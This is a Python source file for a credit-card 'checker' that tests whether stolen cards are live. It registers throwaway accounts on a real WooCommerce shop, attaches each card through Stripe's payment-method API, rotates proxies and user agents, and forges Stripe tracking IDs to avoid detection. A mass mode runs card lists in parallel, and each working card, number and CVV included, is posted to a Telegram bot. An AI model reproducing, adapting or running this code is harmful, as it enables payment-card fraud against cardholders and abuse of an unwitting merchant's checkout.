import requests
import json
import re
import time
import random
import datetime
import os
from typing import Dict, Any, Optional, List
from faker import Faker
from .useragent import get_random_useragent
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

faker = Faker()
print_lock = threading.Lock()

TG_BOT_TOKEN = None
TG_CHAT_ID = None
PROXY_FILE_PATH = 'proxy.txt'

def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def get_country_flag(country_code):
    if not country_code or len(country_code) != 2:
        return ""
    country_code = country_code.upper()
    flag = chr(ord('🇦') + ord(country_code[0]) - ord('A')) + chr(ord('🇦') + ord(country_code[1]) - ord('A'))
    return flag

def send_telegram(card, message_text, raw_response, time_taken, proxy=None):
    try:
        card_number = card.split('|')[0]
        bin_info = get_bin_info(card_number)
        
        if bin_info:
            card_type = bin_info.get('type', 'N/A').upper()
            brand = bin_info.get('brand', 'N/A').upper()
            bank = bin_info.get('bank', 'N/A').upper()
            country = bin_info.get('country', 'N/A').upper()
            country_code = bin_info.get('country_code', '')
            flag = get_country_flag(country_code)
            
            info_line = f"{brand} - {card_type}"
            issuer_line = bank
            country_line = f"{country} {flag}"
        else:
            info_line = "N/A"
            issuer_line = "N/A"
            country_line = "N/A"
            flag = ""
        
        message = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: <code>{card}</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {message_text}

𝗜𝗻𝗳𝗼: {info_line}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer_line}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country_line}

𝗧𝗶𝗺𝗲: {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐁𝐨𝐭 𝐛𝐲: <a href="https://t.me/Tum_bhen_ke_laude">Aditya ⚡</a>'''

        url = f'https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': TG_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=data, timeout=10)
        return True
    except Exception as e:
        print(f"TG Error: {e}")
        return False

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def load_proxies():
    global PROXY_FILE_PATH
    if os.path.exists(PROXY_FILE_PATH):
        with open(PROXY_FILE_PATH, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            return proxies
    return None

def get_random_proxy(proxies):
    if proxies:
        proxy_line = random.choice(proxies)
        parts = proxy_line.split(':')
        
        if len(parts) == 4:
            ip, port, user, passwd = parts
            proxy = f'http://{user}:{passwd}@{ip}:{port}'
        elif len(parts) == 2:
            proxy = f'http://{proxy_line}'
        else:
            proxy = f'http://{proxy_line}'
        
        return {'http': proxy, 'https': proxy}
    return None

def generate_stripe_ids():
    def random_hex(length):
        return ''.join(random.choices('0123456789abcdef', k=length))
    
    guid = f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    muid = f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    sid = f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    client_element = f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    
    return guid, muid, sid, client_element

def parse_card(card_string):
    parts = card_string.strip().split('|')
    if len(parts) == 4:
        return {
            'number': parts[0],
            'month': parts[1],
            'year': parts[2],
            'cvv': parts[3]
        }
    return None

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None,
    proxies: Optional[Dict[str, str]] = None
) -> requests.Response:
 
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {},
        'timeout': 30
    }
    
    if proxies:
        request_kwargs['proxies'] = proxies

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid, proxy=None, silent=False):
    
    session = requests.Session()
    base_url = 'https://dilaboards.com'

    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxy)
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        time.sleep(random.uniform(0.3, 0.8))
    except Exception as e:
        return {"success": False, "message": f"Request 1 Failed: {e}", "raw": None}

    url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    data_2 = {
        'email': faker.email(domain="gmail.com"),
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': url_1,
        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': regester_nouce,
        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
        'register': 'Register',
    }
    
    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session, proxies=proxy)
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        time.sleep(random.uniform(0.3, 0.8))
    except Exception as e:
        return {"success": False, "message": f"Request 2 Failed: {e}", "raw": None}

    url_3 = 'https://api.stripe.com/v1/payment_methods'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    data_3 = {
        'type': 'card',
        'card[number]': card_num,
        'card[cvc]': card_cvv,
        'card[exp_year]': card_yy,
        'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(100000, 999999)), 
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    response_3 = None
    try:
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session, proxies=proxy)
        pm = response_3.json()['id']
        time.sleep(random.uniform(0.3, 0.8))
    except Exception as e:
        try:
            if response_3 is not None:
                error_json = response_3.json()
                error_msg = error_json.get('error', {}).get('message', str(e))
                return {"success": False, "message": error_msg, "raw": response_3.text}
            else:
                return {"success": False, "message": f"Request 3 Failed: {e}", "raw": None}
        except:
            return {"success": False, "message": f"Request 3 Failed: {e}", "raw": None}

    url_4 = f'{base_url}/en/'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    dynamic_params_4 = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    try:
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session, proxies=proxy)
        response_json = response_4.json()
        
        if response_json.get("success"):
            return {
                "success": True, 
                "message": "Payment method added successfully",
                "raw": response_4.text
            }
        else:
            error_msg = response_json.get("data", {}).get("error", {}).get("message", "Your card was declined.")
            return {
                "success": False, 
                "message": error_msg,
                "raw": response_4.text
            }
    except Exception as e:
        return {"success": False, "message": f"Request 4 Failed: {e}", "raw": None}


def check_card(card_string, proxies=None):
    start_time = time.time()
    
    card = parse_card(card_string)
    if not card:
        return {"success": False, "message": "Invalid card format", "card": card_string, "time": 0, "proxy": None}
    
    user_agent = get_random_useragent()
    guid, muid, sid, client_element = generate_stripe_ids()
    proxy = get_random_proxy(proxies) if proxies else None
    
    result = run_automated_process(
        card_num=card['number'],
        card_cvv=card['cvv'],
        card_yy=card['year'],
        card_mm=card['month'],
        user_ag=user_agent,
        client_element=client_element,
        guid=guid,
        muid=muid,
        sid=sid,
        proxy=proxy,
        silent=True
    )
    
    elapsed_time = round(time.time() - start_time, 2)
    result['card'] = card_string
    result['time'] = elapsed_time
    result['proxy'] = list(proxy.values())[0] if proxy else None
    return result


def check_card_worker(args):
    cc, proxies, index, total = args
    result = check_card(cc, proxies)
    return result, index, total


def single_mode():
    proxies = load_proxies()
    
    print(f"\n{Colors.CYAN}{'='*60}")
    print(f"           SINGLE CC CHECKER - @Aditya")
    print(f"{'='*60}{Colors.RESET}")
    
    if proxies:
        print(f"{Colors.GREEN}Proxies loaded: {len(proxies)}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}No proxy.txt found, running without proxy{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}Enter CC (format: number|month|year|cvv)")
    print(f"Example: 4865608090273539|02|2026|540{Colors.RESET}")
    print("-"*60)
    
    cc = input(f"\n{Colors.CYAN}CC > {Colors.RESET}").strip()
    
    if not cc:
        print(f"{Colors.RED}No CC entered!{Colors.RESET}")
        return
    
    print(f"\n{Colors.YELLOW}Checking...{Colors.RESET}")
    result = check_card(cc, proxies)
    
    print(f"\n{'='*60}")
    print(f"{Colors.CYAN}CC: {cc}{Colors.RESET}")
    print("="*60)
    
    if result.get('raw'):
        try:
            raw_json = json.loads(result['raw'])
            print(f"Response: {json.dumps(raw_json)}")
        except:
            print(f"Response: {result['raw']}")
    
    print("-"*60)
    if result['success']:
        print(f"{Colors.GREEN}{Colors.BOLD}✅ Payment method added successfully{Colors.RESET}")
        raw = result.get('raw', '')
        send_telegram(cc, "Payment method added successfully", raw, result['time'], result.get('proxy'))
        print(f"{Colors.YELLOW}Sent to Telegram!{Colors.RESET}")
    else:
        print(f"{Colors.RED}{Colors.BOLD}❌ {result['message']}{Colors.RESET}")
    
    print(f"{Colors.BLUE}Time: {result['time']}s{Colors.RESET}")
    if result.get('proxy'):
        print(f"{Colors.MAGENTA}Proxy: {result['proxy']}{Colors.RESET}")
    print("="*60)


def mass_mode():
    proxies = load_proxies()
    
    print(f"\n{Colors.MAGENTA}{'='*60}")
    print(f"           MASS CC CHECKER - @Aditya")
    print(f"{'='*60}{Colors.RESET}")
    
    if proxies:
        print(f"{Colors.GREEN}Proxies loaded: {len(proxies)}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}No proxy.txt found, running without proxy{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}Enter path to .txt file containing CCs")
    print(f"Format in file: one CC per line (number|month|year|cvv){Colors.RESET}")
    print("-"*60)
    
    file_path = input(f"\n{Colors.CYAN}File Path > {Colors.RESET}").strip()
    
    if not file_path:
        print(f"{Colors.RED}No file path entered!{Colors.RESET}")
        return
    
    if not os.path.exists(file_path):
        print(f"{Colors.RED}File not found: {file_path}{Colors.RESET}")
        return
    
    with open(file_path, 'r') as f:
        cards = [line.strip() for line in f if line.strip()]
    
    if not cards:
        print(f"{Colors.RED}No CCs found in file!{Colors.RESET}")
        return
    
    print(f"\n{Colors.YELLOW}Found {len(cards)} CCs. Starting parallel check (3 threads)...{Colors.RESET}\n")
    
    live_count = 0
    dead_count = 0
    total_start = time.time()
    
    args_list = [(cc, proxies, i+1, len(cards)) for i, cc in enumerate(cards)]
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {executor.submit(check_card_worker, args): args for args in args_list}
        
        for future in as_completed(futures):
            result, index, total = future.result()
            
            with print_lock:
                print(f"{Colors.CYAN}[{index}/{total}] {result['card']}{Colors.RESET}")
                
                if result['success']:
                    live_count += 1
                    print(f"{Colors.GREEN}{Colors.BOLD}✅ Payment method added successfully{Colors.RESET}", end="")
                    raw = result.get('raw', '')
                    send_telegram(result['card'], "Payment method added successfully", raw, result['time'], result.get('proxy'))
                    print(f" {Colors.YELLOW}[TG]{Colors.RESET}", end="")
                else:
                    dead_count += 1
                    print(f"{Colors.RED}{Colors.BOLD}❌ {result['message']}{Colors.RESET}", end="")
                
                print(f" {Colors.BLUE}[{result['time']}s]{Colors.RESET}", end="")
                
                if result.get('proxy'):
                    proxy_short = result['proxy'].split('@')[-1] if '@' in result['proxy'] else result['proxy']
                    print(f" {Colors.MAGENTA}[{proxy_short}]{Colors.RESET}")
                else:
                    print()
                print()
    
    total_time = round(time.time() - total_start, 2)
    
    print(f"{Colors.MAGENTA}{'='*60}")
    print(f"Total: {len(cards)} | {Colors.GREEN}Live: {live_count}{Colors.RESET} | {Colors.RED}Dead: {dead_count}{Colors.RESET} | {Colors.BLUE}Time: {total_time}s{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")


def main():
    global TG_BOT_TOKEN, TG_CHAT_ID, PROXY_FILE_PATH
    
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
    print(f"       ⚡ Stripe Auth Checker by Aditya ⚡")
    print(f"{'='*60}{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}Enter Telegram Bot Token:{Colors.RESET}")
    TG_BOT_TOKEN = input(f"{Colors.CYAN}Bot Token > {Colors.RESET}").strip()
    
    print(f"\n{Colors.YELLOW}Enter Telegram Chat ID:{Colors.RESET}")
    TG_CHAT_ID = input(f"{Colors.CYAN}Chat ID > {Colors.RESET}").strip()
    
    print(f"\n{Colors.YELLOW}Enter Proxy File Path (press Enter for proxy.txt):{Colors.RESET}")
    proxy_path = input(f"{Colors.CYAN}Proxy Path > {Colors.RESET}").strip()
    if proxy_path:
        PROXY_FILE_PATH = proxy_path
    
    proxies = load_proxies()
    if proxies:
        print(f"\n{Colors.GREEN}Proxies loaded: {len(proxies)}{Colors.RESET}")
    else:
        print(f"\n{Colors.YELLOW}No proxies found, running without proxy{Colors.RESET}")
    
    while True:
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}")
        print(f"       ⚡ Stripe Auth Checker by Aditya ⚡")
        print(f"{'='*60}{Colors.RESET}")
        print(f"\n{Colors.GREEN}[1]{Colors.RESET} Single CC Check")
        print(f"{Colors.MAGENTA}[2]{Colors.RESET} Mass CC Check (3 Parallel)")
        print(f"{Colors.RED}[0]{Colors.RESET} Exit")
        print("-"*60)
        
        choice = input(f"\n{Colors.YELLOW}Select Option > {Colors.RESET}").strip()
        
        if choice == '1':
            single_mode()
        elif choice == '2':
            mass_mode()
        elif choice == '0':
            print(f"\n{Colors.CYAN}Exiting... Bye!{Colors.RESET}")
            break
        else:
            print(f"\n{Colors.RED}Invalid option! Please select 1, 2, or 0{Colors.RESET}")


if __name__ == '__main__':
    main()
